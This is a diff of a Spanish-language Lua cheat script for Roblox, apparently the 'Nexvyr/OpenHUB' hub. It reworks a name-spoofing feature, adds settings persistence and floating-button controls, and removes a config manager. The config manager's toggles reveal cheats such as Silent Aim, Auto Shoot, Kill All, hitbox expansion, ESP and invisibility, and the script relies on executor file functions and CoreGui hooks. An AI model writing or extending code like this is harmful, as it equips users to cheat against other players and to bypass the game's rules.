+local humanoidOriginals = setmetatable({}, {__mode = "k"})
+local isActive = false
 
-local function processText(v, myName, myDisp)
+local TEXT_CLASSES = { TextLabel = true, TextBox = true, TextButton = true }
+local scanId = 0
+
+local function isTextObject(v)
+    return TEXT_CLASSES[v.ClassName] == true
+end
+
+local function isOwnRoot(inst)
+    local name = inst.Name
+    return string.find(name, "WindUI", 1, true) ~= nil or string.find(name, "Nexvyr", 1, true) ~= nil
+end
+
+local function isOwnGui(v)
     local parentGui = v:FindFirstAncestorWhichIsA("ScreenGui")
-    if parentGui and (string.find(parentGui.Name, "WindUI") or string.find(parentGui.Name, "Nexvyr")) then return end
-    if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
-        local txt = v.Text
-        local hasName = false
-        if txt and txt ~= "" then
-            if string.find(txt, myName, 1, true) or string.find(txt, myDisp, 1, true) then hasName = true end
+    if parentGui and (string.find(parentGui.Name, "WindUI") or string.find(parentGui.Name, "Nexvyr")) then
+        return true
+    end
+    return false
+end
+
+local function assignFake(p)
+    if not fakeNames[p] then
+        fakeCounter += 1
+        fakeNames[p] = "OpenHUB-" .. fakeCounter
+    end
+    return fakeNames[p]
+end
+
+local function fakeFor(p)
+    if #Players:GetPlayers() <= 1 then return "#OpenHUB" end
+    return assignFake(p)
+end
+
+local function rebuildPairs()
+    table.clear(replacePairs)
+    local list = Players:GetPlayers()
+    if #list > 1 then assignFake(player) end
+    for _, p in ipairs(list) do
+        local fake = fakeFor(p)
+        if p.Name ~= "" then
+            replacePairs[#replacePairs + 1] = { find = p.Name, fake = fake }
         end
-        if hasName and not originalData[v] then
-            originalData[v] = { Text = txt, Color = v.TextColor3, TextTransp = v.TextTransparency, StrokeTransp = v.TextStrokeTransparency, Strokes = {} }
-            for _, obj in pairs(v:GetChildren()) do
-                if obj:IsA("UIStroke") then
-                    originalData[v].Strokes[obj] = { Enabled = obj.Enabled, Transp = obj.Transparency, Thickness = obj.Thickness }
-                end
+        if p.DisplayName ~= "" and p.DisplayName ~= p.Name then
+            replacePairs[#replacePairs + 1] = { find = p.DisplayName, fake = fake }
+        end
+    end
+    table.sort(replacePairs, function(a, b) return #a.find > #b.find end)
+    for i, pair in ipairs(replacePairs) do
+        pair.token = "\1" .. tostring(i) .. "\2"
+    end
+end
+
+local function applyReplace(text)
+    local out = text
+    for _, pair in ipairs(replacePairs) do
+        out = safeReplace(out, pair.find, pair.token)
+    end
+    for _, pair in ipairs(replacePairs) do
+        out = safeReplace(out, pair.token, pair.fake)
+    end
+    return out
+end
+
+local function processText(v, trusted)
+    if not isTextObject(v) then return end
+    if not trusted and isOwnGui(v) then return end
+    local data = originalData[v]
+    if not data then
+        local txt = v.Text
+        if not txt or txt == "" then return end
+        local hasName = false
+        for _, pair in ipairs(replacePairs) do
+            if string.find(txt, pair.find, 1, true) then hasName = true break end
+        end
+        if not hasName then return end
+        data = { Text = txt, Applied = nil }
+        originalData[v] = data
+    end
+    if isActive then
+        local newText = applyReplace(data.Text)
+        data.Applied = newText
+        if v.Text ~= newText then v.Text = newText end
+    else
+        if v.Text ~= data.Text then v.Text = data.Text end
+        originalData[v] = nil
+    end
+end
+
+local function watch(v)
+    if watchedTexts[v] or not isTextObject(v) then return end
+    watchedTexts[v] = true
+    table.insert(visualConnections, v:GetPropertyChangedSignal("Text"):Connect(function()
+        if not isActive then return end
+        local data = originalData[v]
+        if data and v.Text == data.Applied then return end
+        originalData[v] = nil
+        processText(v)
+    end))
+end
+
+local function fullScan()
+    scanId += 1
+    local myScan = scanId
+    for v in pairs(originalData) do
+        if v.Parent then processText(v) else originalData[v] = nil end
+    end
+    local roots = {}
+    local pGui = player:FindFirstChild("PlayerGui")
+    if pGui then
+        for _, child in ipairs(pGui:GetChildren()) do
+            if not isOwnRoot(child) then roots[#roots + 1] = child end
+        end
+    end
+    local okCore, coreGui = pcall(function() return game:GetService("CoreGui") end)
+    if okCore and coreGui then
+        local okKids, kids = pcall(function() return coreGui:GetChildren() end)
+        if okKids then
+            for _, child in ipairs(kids) do
+                if not isOwnRoot(child) then roots[#roots + 1] = child end
             end
         end
-        if originalData[v] then
-            if fakeNameEnabled then
-                local newText = originalData[v].Text
-                newText = safeReplace(newText, myName, spoofNameText)
-                newText = safeReplace(newText, myDisp, spoofNameText)
-                v.Text = newText
-                v.TextTransparency = originalData[v].TextTransp
-                v.TextStrokeTransparency = originalData[v].StrokeTransp
-                v.TextColor3 = originalData[v].Color
-                for _, obj in pairs(v:GetChildren()) do
-                    if obj:IsA("UIStroke") and originalData[v].Strokes[obj] then obj.Enabled = originalData[v].Strokes[obj].Enabled end
+    end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p.Character then roots[#roots + 1] = p.Character end
+    end
+    local sliceStart = os.clock()
+    for _, root in ipairs(roots) do
+        local okDesc, descendants = pcall(function() return root:GetDescendants() end)
+        if okDesc then
+            for i = 1, #descendants do
+                local v = descendants[i]
+                if TEXT_CLASSES[v.ClassName] then
+                    processText(v, true)
+                    watch(v)
                 end
-            else
-                v.Text = originalData[v].Text
-                v.TextColor3 = originalData[v].Color
-                v.TextTransparency = originalData[v].TextTransp
-                v.TextStrokeTransparency = originalData[v].StrokeTransp
-                for _, obj in pairs(v:GetChildren()) do
-                    if obj:IsA("UIStroke") and originalData[v].Strokes[obj] then
-                        obj.Enabled = originalData[v].Strokes[obj].Enabled
-                        obj.Transparency = originalData[v].Strokes[obj].Transp
-                        obj.Thickness = originalData[v].Strokes[obj].Thickness
-                    end
+                if os.clock() - sliceStart > 0.006 then
+                    task.wait()
+                    if not isActive or myScan ~= scanId then return end
+                    sliceStart = os.clock()
                 end
             end
         end
     end
 end
 
-function updateSystem()
-    local myName = player.Name
-    local myDisp = player.DisplayName
-    task.spawn(function()
-        for _, p in pairs(Players:GetPlayers()) do
-            if p.Character then
-                for _, v in pairs(p.Character:GetDescendants()) do
-                    if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then processText(v, myName, myDisp) end
-                end
-            end
+local function quickRefresh()
+    scanId += 1
+    local myScan = scanId
+    local list = {}
+    for v in pairs(watchedTexts) do list[#list + 1] = v end
+    local sliceStart = os.clock()
+    for i = 1, #list do
+        local v = list[i]
+        if v.Parent then processText(v, true) else originalData[v] = nil end
+        if os.clock() - sliceStart > 0.006 then
+            task.wait()
+            if not isActive or myScan ~= scanId then return end
+            sliceStart = os.clock()
         end
-        local pGui = player:FindFirstChild("PlayerGui")
-        if pGui then
-            for _, v in pairs(pGui:GetDescendants()) do
-                if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then processText(v, myName, myDisp) end
-            end
+    end
+end
+
+local function onAdded(obj)
+    if not isActive then return end
+    if isTextObject(obj) then
+        task.spawn(function()
+            if not isActive then return end
+            if isOwnGui(obj) then return end
+            processText(obj, true)
+            watch(obj)
+        end)
+    end
+end
+
+local function applyHumanoidNames()
+    for _, p in ipairs(Players:GetPlayers()) do
+        local char = p.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            if humanoidOriginals[hum] == nil then humanoidOriginals[hum] = hum.DisplayName end
+            local fake = fakeFor(p)
+            if hum.DisplayName ~= fake then hum.DisplayName = fake end
+        end
+    end
+end
+
+local function restoreHumanoidNames()
+    for hum, name in pairs(humanoidOriginals) do
+        if hum.Parent then pcall(function() hum.DisplayName = name end) end
+    end
+    table.clear(humanoidOriginals)
+end
+
+local function connectWatchers()
+    local pGui = player:FindFirstChild("PlayerGui")
+    if pGui then
+        table.insert(visualConnections, pGui.DescendantAdded:Connect(onAdded))
+    end
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        table.insert(visualConnections, coreGui.DescendantAdded:Connect(onAdded))
+    end)
+    local function hookCharacter(p)
+        table.insert(visualConnections, p.CharacterAdded:Connect(function(char)
+            if not isActive then return end
+            local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
+            if not hum or not isActive then return end
+            if humanoidOriginals[hum] == nil then humanoidOriginals[hum] = hum.DisplayName end
+            local fake = fakeFor(p)
+            if hum.DisplayName ~= fake then hum.DisplayName = fake end
+        end))
+    end
+    for _, p in ipairs(Players:GetPlayers()) do hookCharacter(p) end
+    local function playersChanged()
+        if not isActive then return end
+        rebuildPairs()
+        pcall(applyHumanoidNames)
+        task.spawn(quickRefresh)
+        task.delay(0.5, function()
+            if isActive then task.spawn(fullScan) end
+        end)
+    end
+    table.insert(visualConnections, Players.PlayerAdded:Connect(function(p)
+        hookCharacter(p)
+        playersChanged()
+    end))
+    table.insert(visualConnections, Players.PlayerRemoving:Connect(function()
+        task.defer(playersChanged)
+    end))
+end
+
+local function startHumanoidLoop()
+    task.spawn(function()
+        while isActive do
+            pcall(applyHumanoidNames)
+            task.wait(0.3)
         end
     end)
+end
 
+function updateSystem()
     if fakeNameEnabled then
-        if not isWorkspaceLooping then
-            isWorkspaceLooping = true
-            local function infectarTextoSeguro(v)
-                local parentGui = v:FindFirstAncestorWhichIsA("ScreenGui")
-                if parentGui and (string.find(parentGui.Name, "WindUI") or string.find(parentGui.Name, "Nexvyr")) then return end
-                if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
-                    processText(v, myName, myDisp)
-                    if not nexvyrFakeTextConnections[v] then
-                        nexvyrFakeTextConnections[v] = true
-                        table.insert(visualConnections, v:GetPropertyChangedSignal("Text"):Connect(function()
-                            if isWorkspaceLooping and v.Text ~= spoofNameText and not string.find(v.Text, spoofNameText) then
-                                originalData[v] = nil
-                                processText(v, myName, myDisp)
-                            end
-                        end))
-                    end
-                end
-            end
-            local pGui = player:FindFirstChild("PlayerGui")
-            if pGui then
-                table.insert(visualConnections, pGui.DescendantAdded:Connect(function(nuevoObjeto)
-                    if isWorkspaceLooping and (nuevoObjeto:IsA("TextLabel") or nuevoObjeto:IsA("TextBox") or nuevoObjeto:IsA("TextButton")) then
-                        task.spawn(function() infectarTextoSeguro(nuevoObjeto) end)
-                    end
-                end))
-            end
-            local successCore, coreGui = pcall(function() return game:GetService("CoreGui") end)
-            if successCore and coreGui then
-                table.insert(visualConnections, coreGui.DescendantAdded:Connect(function(nuevoObjeto)
-                    if isWorkspaceLooping and (nuevoObjeto:IsA("TextLabel") or nuevoObjeto:IsA("TextBox") or nuevoObjeto:IsA("TextButton")) then
-                        task.spawn(function() infectarTextoSeguro(nuevoObjeto) end)
-                    end
-                end))
-            end
+        if not isActive then
+            isActive = true
+            table.clear(fakeNames)
+            fakeCounter = 0
+            rebuildPairs()
+            connectWatchers()
+            startHumanoidLoop()
+        else
+            rebuildPairs()
         end
-    else
-        isWorkspaceLooping = false
+        task.spawn(fullScan)
+    elseif isActive then
+        isActive = false
         for _, conn in ipairs(visualConnections) do conn:Disconnect() end
         visualConnections = {}
-        table.clear(nexvyrFakeTextConnections)
+        table.clear(watchedTexts)
         for v, data in pairs(originalData) do
-            if v and v.Parent then
-                v.Text = data.Text
-                v.TextColor3 = data.Color
-                v.TextTransparency = data.TextTransp
-                v.TextStrokeTransparency = data.StrokeTransp
-                for stroke, strokeData in pairs(data.Strokes) do
-                    if stroke and stroke.Parent then
-                        stroke.Enabled = strokeData.Enabled
-                        stroke.Transparency = strokeData.Transp
-                        stroke.Thickness = strokeData.Thickness
-                    end
-                end
+            if v and v.Parent and v.Text ~= data.Text then
+                pcall(function() v.Text = data.Text end)
             end
         end
         originalData = {}
+        restoreHumanoidNames()
+        table.clear(replacePairs)
+        table.clear(fakeNames)
+        fakeCounter = 0
     end
 end
 
@@ -5218,16 +5588,7 @@ UIElements.TogFakeName = Tabs.Identidad:Toggle({
     end
 })
 
-UIElements.InpFakeName = Tabs.Identidad:Input({
-    Title = "Nuevo Nombre",
-    Placeholder = "Escribe tu nombre falso...",
-    Callback = function(t)
-        if t ~= "" then
-            spoofNameText = t
-            if fakeNameEnabled then updateSystem() end
-        end
-    end
-})
+persistToggle("TogFakeName", UIElements.TogFakeName, function() return fakeNameEnabled end)
 
 player.CharacterAdded:Connect(function()
     if fakeNameEnabled then
@@ -5238,219 +5599,9 @@ end)
 end
 
 do
-local configFolder = "NexvyrHub_Configs_WindUI"
-if isfolder and not isfolder(configFolder) then pcall(function() makefolder(configFolder) end) end
-
-local availableConfigs = { "Ninguna" }
-local selectedConfig = "Ninguna"
-local customConfigName = ""
-
-Tabs.Guardado:Section({ Title = "Gestor de Configs", Icon = "solar:diskette-bold" })
-local configDropdown = Tabs.Guardado:Dropdown({
-    Title = "Seleccionar Configuración",
-    Values = availableConfigs,
-    Value = "Ninguna",
-    Callback = function(Value) selectedConfig = Value end
-})
-
-local function refreshConfigs()
-    local list = {}
-    if listfiles then
-        pcall(function()
-            for _, file in ipairs(listfiles(configFolder)) do
-                if file:match("%.json$") then
-                    local name = file:match("([^/\\]+)%.json$")
-                    if name then table.insert(list, name) end
-                end
-            end
-        end)
-    end
-    if #list == 0 then table.insert(list, "Ninguna") end
-    pcall(function()
-        configDropdown:Refresh(list)
-        if selectedConfig == "Ninguna" or not table.find(list, selectedConfig) then
-            configDropdown:Select(list[1])
-            selectedConfig = list[1]
-        end
-    end)
-end
-
-Tabs.Guardado:Button({ Title = "Actualizar Lista", Icon = "solar:refresh-bold", Variant = "Secondary", Callback = function() refreshConfigs() end })
-Tabs.Guardado:Input({ Title = "Nombre para Guardar", Placeholder = "Ej: Config 1, Config 2...", Icon = "solar:text-field-bold", Callback = function(Text) customConfigName = Text end })
-
-local deleteConfirmPending = false
-local deleteConfirmTime = 0
-
-Tabs.Guardado:Button({
-    Title = "Eliminar todos los guardados",
-    Icon = "solar:trash-bin-trash-bold",
-    Variant = "Danger",
-    Callback = function()
-        local now = os.clock()
-        if deleteConfirmPending and (now - deleteConfirmTime) < 4 then
-            deleteConfirmPending = false
-            if listfiles then
-                pcall(function()
-                    for _, file in ipairs(listfiles(configFolder)) do
-                        if file:match("%.json$") then pcall(function() delfile(file) end) end
-                    end
-                end)
-            end
-            refreshConfigs()
-        else
-            deleteConfirmPending = true
-            deleteConfirmTime = now
-        end
-    end
-})
-
-local function secureLoadToggle(element, val)
-    if not element or val == nil then return end
-    pcall(function() element:Set(val) end)
-end
-
-Tabs.Guardado:Button({
-    Title = "Guardar Configuración",
-    Icon = "solar:diskette-bold",
-    Variant = "Primary",
-    Callback = function()
-        local finalName = customConfigName:gsub("[^%w%s%-]", "")
-        if finalName == "" then finalName = selectedConfig end
-        if finalName == "" or finalName == "Ninguna" then
-            return
-        end
-        local path = configFolder .. "/" .. finalName .. ".json"
-        local configData = {
-            ConfigName = finalName,
-            Toggles = {
-                ["Auto Shoot"] = autoShootEnabled,
-                ["Auto Shoot Agresivo"] = autoShootAgresivoEnabled,
-                ["Equipar pistola"] = equipGunEnabled,
-                ["Silent Aim (Manual)"] = silentAimManualEnabled,
-                ["Silent Aim (FOV)"] = silentAimFovEnabled,
-                ["Mostrar Círculo FOV"] = fovVisiblePreference,
-                ["Team Check"] = teamCheckEnabled,
-                ["ESP Jugadores"] = espEnabled,
-                ["ESP Glow"] = espSettings.Glow,
-                ["Kill All"] = KillAllEnabled,
-                ["Hitbox Activar"] = hitboxEnabled,
-                ["Hitbox Invisible"] = hitboxInvisible,
-                ["Headless"] = HeadlessEnabled,
-                ["Korblox"] = KorbloxEnabled,
-                ["Nombre Falso"] = fakeNameEnabled,
-                ["Invisible"] = InvisibilityActive
-            },
-            Sliders = { ["Tamaño del FOV"] = fovRadius, ["Tamaño de Hitbox"] = hitboxSize, ["Volumen Kill Sound"] = KillSoundVolume, ["Ajuste Speed"] = SPEED, ["Ajuste Salto"] = JUMP_POWER },
-            Colors = { ["Color de Hitbox"] = {R = hitboxColor.R, G = hitboxColor.G, B = hitboxColor.B}, ["Color del ESP"] = {R = espColor.R, G = espColor.G, B = espColor.B} },
-            Extras = { ["Parte Silent Aim"] = silentAimTargetPart, ["Nombre Falso Texto"] = spoofNameText }
-        }
-        if writefile then
-            local sEncode, encodedData = pcall(function() return HttpService:JSONEncode(configData) end)
-            if sEncode then
-                pcall(function() writefile(path, encodedData) end)
-                refreshConfigs()
-                pcall(function() configDropdown:Select(finalName) end)
-            end
-        end
-    end
-})
-
-Tabs.Guardado:Button({
-    Title = "Cargar Configuración",
-    Icon = "solar:folder-open-bold",
-    Variant = "Primary",
-    Callback = function()
-        if selectedConfig == "Ninguna" or selectedConfig == "" then
-            return
-        end
-        local path = configFolder .. "/" .. selectedConfig .. ".json"
-        if isfile and isfile(path) then
-            local success, decoded = pcall(function() return HttpService:JSONDecode(readfile(path)) end)
-            if success and type(decoded) == "table" then
-                if decoded.Toggles then
-                    if decoded.Toggles["Auto Shoot"] ~= nil then autoShootEnabled = decoded.Toggles["Auto Shoot"] secureLoadToggle(UIElements.TogAutoShoot, autoShootEnabled) end
-                    if decoded.Toggles["Auto Shoot Agresivo"] ~= nil then autoShootAgresivoEnabled = decoded.Toggles["Auto Shoot Agresivo"] secureLoadToggle(UIElements.TogAutoShootAgr, autoShootAgresivoEnabled) end
-                    if decoded.Toggles["Equipar pistola"] ~= nil then equipGunEnabled = decoded.Toggles["Equipar pistola"] secureLoadToggle(UIElements.TogEquipGun, equipGunEnabled) end
-                    if decoded.Toggles["Silent Aim (Manual)"] ~= nil then silentAimManualEnabled = decoded.Toggles["Silent Aim (Manual)"] secureLoadToggle(UIElements.TogSilentAimManual, silentAimManualEnabled) end
-                    if decoded.Toggles["Silent Aim (FOV)"] ~= nil then silentAimFovEnabled = decoded.Toggles["Silent Aim (FOV)"] secureLoadToggle(UIElements.TogSilentAimFOV, silentAimFovEnabled) end
-                    if decoded.Toggles["Mostrar Círculo FOV"] ~= nil then fovVisiblePreference = decoded.Toggles["Mostrar Círculo FOV"] secureLoadToggle(UIElements.TogShowFOV, fovVisiblePreference) end
-                    if decoded.Toggles["Team Check"] ~= nil then teamCheckEnabled = decoded.Toggles["Team Check"] end
-                    if decoded.Toggles["ESP Jugadores"] ~= nil then espEnabled = decoded.Toggles["ESP Jugadores"] secureLoadToggle(UIElements.TogEsp, espEnabled) end
-                    if decoded.Toggles["ESP Glow"] ~= nil then espSettings.Glow = decoded.Toggles["ESP Glow"] secureLoadToggle(UIElements.TogEspGl, espSettings.Glow) end
-                    if decoded.Toggles["Kill All"] ~= nil then
-                        KillAllEnabled = decoded.Toggles["Kill All"]
-                        secureLoadToggle(UIElements.TogKillAll, KillAllEnabled)
-                        if KillAllEnabled then KillAllInstance:Start() else KillAllInstance:Stop() end
-                    end
-                    if decoded.Toggles["Hitbox Activar"] ~= nil then
-                        hitboxEnabled = decoded.Toggles["Hitbox Activar"]
-                        secureLoadToggle(UIElements.TogHitbox, hitboxEnabled)
-                        if hitboxEnabled then nexvyrStartHitboxWorker() else limpiarHitboxes() end
-                    end
-                    if decoded.Toggles["Hitbox Invisible"] ~= nil then
-                        hitboxInvisible = decoded.Toggles["Hitbox Invisible"]
-                        secureLoadToggle(UIElements.TogHitboxInvisible, hitboxInvisible)
-                    end
-                    if decoded.Toggles["Headless"] ~= nil then HeadlessEnabled = decoded.Toggles["Headless"] secureLoadToggle(UIElements.TogHeadless, HeadlessEnabled) if HeadlessEnabled then setHeadless(true) else setHeadless(false) end end
-                    if decoded.Toggles["Korblox"] ~= nil then KorbloxEnabled = decoded.Toggles["Korblox"] secureLoadToggle(UIElements.TogKorblox, KorbloxEnabled) if KorbloxEnabled then applyKorblox() else removeKorblox() end end
-                    if decoded.Toggles["Nombre Falso"] ~= nil then fakeNameEnabled = decoded.Toggles["Nombre Falso"] secureLoadToggle(UIElements.TogFakeName, fakeNameEnabled) updateSystem() end
-                    if decoded.Toggles["Invisible"] ~= nil then
-                        InvisibilityActive = decoded.Toggles["Invisible"]
-                        secureLoadToggle(UIElements.TogInvisible, InvisibilityActive)
-                        AplicarInvisibilidadTransparencia(InvisibilityActive)
-                        if nexvyrSetInvisibleWorker then nexvyrSetInvisibleWorker(InvisibilityActive) end
-                    end
-                end
-                if decoded.Sliders then
-                    if decoded.Sliders["Tamaño del FOV"] ~= nil then fovRadius = decoded.Sliders["Tamaño del FOV"] secureLoadToggle(UIElements.SliFOVSize, fovRadius) end
-                    if decoded.Sliders["Tamaño de Hitbox"] ~= nil then hitboxSize = decoded.Sliders["Tamaño de Hitbox"] secureLoadToggle(UIElements.SliHitboxSize, hitboxSize) end
-                    if decoded.Sliders["Volumen Kill Sound"] ~= nil then
-                        KillSoundVolume = decoded.Sliders["Volumen Kill Sound"]
-                        KillSoundPlayer.Volume = KillSoundVolume
-                        ShootSoundPlayer.Volume = KillSoundVolume
-                        ReloadSoundPlayer.Volume = KillSoundVolume
-                        secureLoadToggle(UIElements.SliKillSoundVolume, KillSoundVolume)
-                    end
-                    if decoded.Sliders["Ajuste Speed"] ~= nil then SPEED = decoded.Sliders["Ajuste Speed"] secureLoadToggle(UIElements.SliSpeed, SPEED) end
-                    if decoded.Sliders["Ajuste Salto"] ~= nil then JUMP_POWER = decoded.Sliders["Ajuste Salto"] secureLoadToggle(UIElements.SliJumpPower, JUMP_POWER) end
-                end
-                if decoded.Colors then
-                    if decoded.Colors["Color de Hitbox"] then
-                        hitboxColor = Color3.new(decoded.Colors["Color de Hitbox"].R, decoded.Colors["Color de Hitbox"].G, decoded.Colors["Color de Hitbox"].B)
-                        if UIElements.ColHitbox then pcall(function() UIElements.ColHitbox:Update(hitboxColor) end) end
-                    end
-                    if decoded.Colors["Color del ESP"] then
-                        local cEsp = Color3.new(decoded.Colors["Color del ESP"].R, decoded.Colors["Color del ESP"].G, decoded.Colors["Color del ESP"].B)
-                        espColor = cEsp
-                        if UIElements.ColEsp then pcall(function() UIElements.ColEsp:Update(cEsp) end) end
-                    end
-                end
-                if decoded.Extras then
-                    if decoded.Extras["Parte Silent Aim"] then
-                        silentAimTargetPart = decoded.Extras["Parte Silent Aim"]
-                        if UIElements.DropSilentAimPart then pcall(function() UIElements.DropSilentAimPart:Select(silentAimTargetPart) end) end
-                    end
-                    if decoded.Extras["Nombre Falso Texto"] then
-                        spoofNameText = decoded.Extras["Nombre Falso Texto"]
-                        secureLoadToggle(UIElements.InpFakeName, spoofNameText)
-                        if fakeNameEnabled then updateSystem() end
-                    end
-                end
-                if nexvyrUpdateTargetFeatures then nexvyrUpdateTargetFeatures() end
-                if nexvyrStartFOVWorker then nexvyrStartFOVWorker() end
-            end
-        end
-    end
-})
-
-task.spawn(function()
-    task.wait(1)
-    refreshConfigs()
-end)
-end
-
-do
 Tabs.Graficos:Section({ Title = "Presets de Iluminación", Icon = "solar:palette-bold" })
+
+local gfxActive = {}
 
 local nocheSangrientaEffects = {}
 local atardecerEffects = {}
@@ -6110,6 +6261,7 @@ nocheTog = Tabs.Graficos:Toggle({
     Title = "Noche Sangrienta",
     Value = false,
     Callback = function(state)
+        gfxActive.Noche = state
         if state then
             if atardecerTog then pcall(function() atardecerTog:Set(false) end) end
             if sinVidaTog then pcall(function() sinVidaTog:Set(false) end) end
@@ -6124,6 +6276,7 @@ atardecerTog = Tabs.Graficos:Toggle({
     Title = "Atardecer Fantástico",
     Value = false,
     Callback = function(state)
+        gfxActive.Atardecer = state
         if state then
             if nocheTog then pcall(function() nocheTog:Set(false) end) end
             if sinVidaTog then pcall(function() sinVidaTog:Set(false) end) end
@@ -6138,6 +6291,7 @@ sinVidaTog = Tabs.Graficos:Toggle({
     Title = "Sin Vida",
     Value = false,
     Callback = function(state)
+        gfxActive.SinVida = state
         if state then
             if nocheTog then pcall(function() nocheTog:Set(false) end) end
             if atardecerTog then pcall(function() atardecerTog:Set(false) end) end
@@ -6152,6 +6306,7 @@ finalTog = Tabs.Graficos:Toggle({
     Title = "El final",
     Value = false,
     Callback = function(state)
+        gfxActive.Final = state
         if state then
             if nocheTog then pcall(function() nocheTog:Set(false) end) end
             if atardecerTog then pcall(function() atardecerTog:Set(false) end) end
@@ -6166,6 +6321,7 @@ skypeTog = Tabs.Graficos:Toggle({
     Title = "skype",
     Value = false,
     Callback = function(state)
+        gfxActive.Skype = state
         if state then
             if nocheTog then pcall(function() nocheTog:Set(false) end) end
             if atardecerTog then pcall(function() atardecerTog:Set(false) end) end
@@ -6175,6 +6331,12 @@ skypeTog = Tabs.Graficos:Toggle({
         ApplySkype(state)
     end
 })
+
+persistToggle("GfxNoche", nocheTog, function() return gfxActive.Noche == true end)
+persistToggle("GfxAtardecer", atardecerTog, function() return gfxActive.Atardecer == true end)
+persistToggle("GfxSinVida", sinVidaTog, function() return gfxActive.SinVida == true end)
+persistToggle("GfxFinal", finalTog, function() return gfxActive.Final == true end)
+persistToggle("GfxSkype", skypeTog, function() return gfxActive.Skype == true end)
 end
 
 do
@@ -6520,6 +6682,7 @@ local function createButton(def, index, parent)
             btn.Position = UDim2.fromOffset(x, y)
         end,
         Home = goHome,
+        SetVisible = function(v) btn.Visible = v end,
     }
 end
 
@@ -6568,6 +6731,48 @@ UIElements.TogFloatButtons = Tabs.Botones:Toggle({
     Callback = function(v)
         floatGui.Enabled = v
         if v then for _, b in ipairs(buttons) do b.Sync() end end
+    end
+})
+
+local floatLabels = { ESP = "ESP", AutoShoot = "Auto Shoot", SilentAim = "Silent Aim", Invisible = "Invisible" }
+local floatSelected = { "Todos" }
+
+local function normalizeFloatSelection(list)
+    local result = {}
+    if type(list) == "string" then
+        result[1] = list
+    elseif type(list) == "table" then
+        for _, entry in ipairs(list) do
+            if type(entry) == "string" then
+                result[#result + 1] = entry
+            elseif type(entry) == "table" and type(entry.Title) == "string" then
+                result[#result + 1] = entry.Title
+            end
+        end
+    end
+    return result
+end
+
+local function applyFloatSelection(list)
+    local normalized = normalizeFloatSelection(list)
+    floatSelected = normalized
+    local set = {}
+    for _, name in ipairs(normalized) do set[name] = true end
+    local all = set["Todos"] == true
+    for i, def in ipairs(defs) do
+        local label = floatLabels[def.Name]
+        if buttons[i] then buttons[i].SetVisible(all or set[label] == true) end
+    end
+end
+
+UIElements.DropFloatButtons = Tabs.Botones:Dropdown({
+    Title = "Botones a mostrar",
+    Values = { "Todos", "ESP", "Auto Shoot", "Silent Aim", "Invisible" },
+    Value = { "Todos" },
+    Multi = true,
+    AllowNone = true,
+    Callback = function(Value)
+        applyFloatSelection(Value)
     end
 })
 
@@ -6624,6 +6829,24 @@ task.spawn(function()
     task.wait(1.5)
     refrescarEmotes()
 end)
+
+persist("DropFloatButtons", function() return floatSelected end, function(v)
+    applyFloatSelection(v)
+    if UIElements.DropFloatButtons then UIElements.DropFloatButtons:Select(normalizeFloatSelection(v)) end
+end)
+persist("EmoteSelected", function()
+    return emoteSpamSelected and emoteSpamSelected.Name or nil
+end, function(v)
+    if type(v) == "string" and v ~= "" and v ~= "Ninguno" then
+        emoteSpamSelected = { Kind = "equipped", Name = v }
+        task.spawn(function()
+            task.wait(1.4)
+            pcall(function() emoteDropdown:Select(v) end)
+        end)
+    end
+end)
+persistToggle("TogFloatButtons", UIElements.TogFloatButtons, function() return floatGui.Enabled end)
+persistToggle("TogEmoteSpam", UIElements.TogEmoteSpam, function() return emoteGui.Enabled end)
 end
 
 do
@@ -6638,6 +6861,38 @@ do
         windowOpen = not windowOpen
         pcall(function()
             if windowOpen then Window:Open() else Window:Close() end
+        end)
+    end)
+end
+
+do
+    task.spawn(function()
+        task.wait(0.3)
+        local data = Persist.Data
+        Persist.Loading = true
+        if type(data) == "table" and type(data.Values) == "table" then
+            local applied = 0
+            for _, key in ipairs(Persist.Order) do
+                local item = Persist.Items[key]
+                local value = data.Values[key]
+                if item and value ~= nil then
+                    pcall(item.Set, value)
+                    applied += 1
+                    if applied % 6 == 0 then RunService.Heartbeat:Wait() end
+                end
+            end
+        end
+        Persist.Loading = false
+        Persist.Ready = true
+        Persist.Save()
+        task.spawn(function()
+            while true do
+                task.wait(5)
+                Persist.Save()
+            end
+        end)
+        Players.PlayerRemoving:Connect(function(p)
+            if p == player then Persist.Save() end
         end)
     end)
 end
